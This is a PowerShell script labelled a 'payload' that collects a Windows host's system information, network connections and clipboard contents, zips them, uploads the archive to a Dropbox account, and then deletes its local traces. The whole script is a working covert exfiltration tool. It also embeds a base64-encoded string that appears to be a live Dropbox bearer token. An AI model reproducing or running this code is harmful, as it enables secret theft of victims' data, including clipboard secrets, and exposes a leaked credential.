# === Fred Payload Rebuild (Windows Version with Base64 Token) ===

# Configuration
$LogFile = "$env:TEMP\fred_debug_log.txt"
$DumpPath = "$env:TEMP\FredDump"
$ZipPath = "$env:TEMP\FredDump.zip"
$DropPath = "/FredDump.zip"
$ChunkSize = 8MB

# --- TOKEN HANDLING (Base64 Encoded)
# Replace this with your actual base64-encoded token
$encodedToken = "QmVhcmVyIHNsLnUuQUZ6ejRyY3RKSzk3WWFfNTFRdUhLMXZxRTN5V0hsLW5JMHVLU0d6M2FYYTVtZVFuSWFqbTc4R0NUbXZNbU9lN01RbkM5SWR5OVh1emFDMUVTeWF3RVdORlZMcjJpcnBDZXVCZzhHZ2E4WjRTVWp0WlRpRm9yZUthdjV2Z2YyaFhiTWt4RjJPcWEzazJadW5mZ1VTdHMzTWpvYTRwTHQ4Z3JwT1hNbHpKSFlsWkpqay1ROVFCWUFnd2xDUUE1VWxBcmUwY29oNVlxMWxSMlRCSTdtSm8zVm5SMjA1ZGRPYjhPZUFiRjBsV0ptT3V2UVpZcjdESDBrQVRfelVUOXd0NS1Kb19qUnJfTGpwekNTMVB4T3UyWENuaVIyaWE5cnllNGtVMmtiYl93T1dETzhKME5iVzNWOTdERFprOUVpU3dwSGZPcExRTzRIT0RrYW5HUFUwUTNQcW1NMWlMdlJNYlNIMW5jX0xRQnZtWFp0cF9xNy1ZbFA1bzIwaEpBNEhsZGgxSEtGUVlNTmcyWkVvQmVtTXdJTVVFWFBTVFZsVldCN3Y4Sm40S29wNC03SEdoMUQ0OFMyOVRNRklfOG9VTnZwYWxtbF9TdDkydjNZdXdFdW14c3RjYkxFWFRzT0dJSWJhUmxqUVkzamtjTGc2NTNVUHkxLTJzNTU0Y3I1bVZIOGpqYnc0T0l3QUh3TDhNT21fZW9DTEJOWXRQNnI0Y3psajJ0QmQ4cTJJQUQxSWROZWhCbXhCT2lZSFpuNFhLWS1ST1BBRXVhQzlxVnJ3bm9rVng0SUxISEY1Mm9zdFBPM2ZBVUYwMG1pVlFoYzRSaDJTemMyRFlJc3lSUVhFZy1ERW9BMzZHX29fWmQ5SXdGOF9vaDFPN0VhN3lKRGlsQWNKZFVMTG9PSGp1dHlUQ29EZEppSWFGVVVEdjNsdE1FMUtHN21BUzhBa2RGTmk1NzlubUU1c0plYVVxR3YzMFcxX1d4ZXFWb0RZX0JBTEN0WXZUc3JvWk84SjV5ZUNseHpBWDk3S1QzZUgzRFZTeGd5S1luNVdLVmtPbEFoQkNRRVRnNDllQWNHOEZkNWM3VzM0dkF4b3lFanNGSFBVZkVLbEdFZlVoZWk0cDZ4TmRneVlSVlQ2VEpXbkcyTFQxVXpwRElGZmIxcmtES1lDSTgyUEtkTGNUWVREcmlrS1A2d0Z1WlJ3UHY2TjdQeTJkOGpQeVE0RW5BcFlYMmJnWXpUcFpDcFZGendSbEVsdzkyZTlJZGUzMGkwVkRneWk1RnhpYWZYN2R4NFZfdlFWVFR1dWczNG9aanp5TDh5eTl0R2d0bV9jYzlsZm5sZEEyZU5xeG9DUE1oSTdjbS04T2RYRnR0bkxCQ2FsaUE0REx2VXR5Z3diY0NoWURuVVJhclJMU2RGNmpzNG9tV1FRQW53dThxZEVILXItMktQYUhmM2lqQmhvaC1wSXBHcHN3ZjNLUzdOaVp6dldXVkVoczY3UGNteEdENFFTYmZSS1JiRXJ3dFhrcVJidDE4UXduR2YwT3FpaEZSdGoweXRHWHZGdVlsRFRuUF9xME56SFdDZHNHRFNiWW9fc25HeXl5a25tZzlmbHlHSU9VeDljUkMyek1uMTYwcXFUNzRad3N4UlVJRmtjZEVraDJWOVg5LWFtdlVTOGFKR1ozbXlsTDYzN0hja0ZneEFYUkFiMktjSGdXY1UtY0VZOU1lelRKOEZfSjVWLUpXanY2X0JESlBkTF9rMWdsODFXTEJpY2RvTkJRQlplVjRyNTlGaEQ4bnlneEpCOHJXTjFNc2pUci0yNkxnZ3o0ZmZXdGZSUmlIc0JfWXAwelowbVdFa2NacUNBbG9PaENxeDV2c2N1Sndab3lOeHlfWmlpN0JNeWNoODdLMndhYwo="  # <-- replace with your value
$Token = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedToken))

# --- Start logging
Start-Transcript -Path $LogFile -Append
Write-Host "[DEBUG] Script started at $(Get-Date)"
Write-Host "[DEBUG] Running as $env:USERNAME on $env:COMPUTERNAME"

if (-not $Token) {
    Write-Host "[ERROR] Dropbox API token not found."
    Stop-Transcript
    exit 1
}

# --- Create Dump Folder
try {
    New-Item -ItemType Directory -Path $DumpPath -Force | Out-Null
    Write-Host "[DEBUG] Created dump folder: $DumpPath"
} catch {
    Write-Host "[ERROR] Could not create dump folder: $_"
    Stop-Transcript
    exit 1
}

# --- Collect System Info
Write-Host "[DEBUG] Collecting system data..."
try {
    Get-ComputerInfo | Out-File "$DumpPath\systeminfo.txt"
    Get-CimInstance Win32_Processor | Format-List * | Out-File "$DumpPath\cpu.txt"
    Get-CimInstance Win32_OperatingSystem | Select-Object TotalVisibleMemorySize, FreePhysicalMemory | Out-File "$DumpPath\memory.txt"
    Get-PSDrive -PSProvider 'FileSystem' | Out-File "$DumpPath\disk.txt"
    Get-NetIPAddress | Out-File "$DumpPath\network_ip.txt"
    Get-NetRoute | Out-File "$DumpPath\network_routes.txt"
    Get-NetTCPConnection | Out-File "$DumpPath\network_connections.txt"

    try {
        Get-Clipboard | Out-File "$DumpPath\clipboard.txt"
    } catch {
        Write-Host "[DEBUG] Clipboard access skipped: $_"
    }
} catch {
    Write-Host "[WARNING] Data collection failed: $_"
}

# --- Compress Data
Write-Host "[DEBUG] Compressing dump data..."
try {
    Compress-Archive -Path "$DumpPath\*" -DestinationPath $ZipPath -Force
    Write-Host "[DEBUG] Created archive: $ZipPath"
} catch {
    Write-Host "[ERROR] Compression failed: $_"
    Stop-Transcript
    exit 1
}

# --- Upload to Dropbox
Write-Host "[DEBUG] Uploading to Dropbox..."
try {
    $fs = [IO.File]::OpenRead($ZipPath)
    $buffer = New-Object byte[] $ChunkSize
    $fs.Read($buffer, 0, $ChunkSize) | Out-Null

    $headers = @{
        "Authorization" = $Token
        "Content-Type" = "application/octet-stream"
        "Dropbox-API-Arg" = '{"close": false}'
    }

    $res = Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload_session/start" -Method Post -Headers $headers -Body $buffer[0..($fs.Position-1)]
    $session = $res.session_id
    Write-Host "[DEBUG] Session ID: $session"

    while ($fs.Position -lt $fs.Length) {
        $read = $fs.Read($buffer, 0, $ChunkSize)
        $offset = $fs.Position - $read

        $headers = @{
            "Authorization" = $Token
            "Content-Type" = "application/octet-stream"
            "Dropbox-API-Arg" = '{"cursor":{"session_id":"'+$session+'","offset":'+$offset+'},"close":false}'
        }

        Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload_session/append_v2" -Method Post -Headers $headers -Body $buffer[0..($read-1)]
        Write-Host "[DEBUG] Uploaded chunk at offset $offset"
    }

    $headers = @{
        "Authorization" = $Token
        "Content-Type" = "application/octet-stream"
        "Dropbox-API-Arg" = '{"cursor":{"session_id":"'+$session+'","offset":'+$fs.Length+'},"commit":{"path":"'+$DropPath+'","mode":"overwrite"}}'
    }

    Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload_session/finish" -Method Post -Headers $headers -Body $null
    Write-Host "[✓] Upload complete."
    $fs.Close()
} catch {
    Write-Host "[ERROR] Upload failed: $_"
    try { $fs.Close() } catch {}
    Stop-Transcript
    exit 1
}

# --- Cleanup
Write-Host "[DEBUG] Cleaning up..."
Remove-Item $ZipPath, $DumpPath -Recurse -Force -ErrorAction SilentlyContinue
Write-Host "[DEBUG] Cleanup complete."
Stop-Transcript
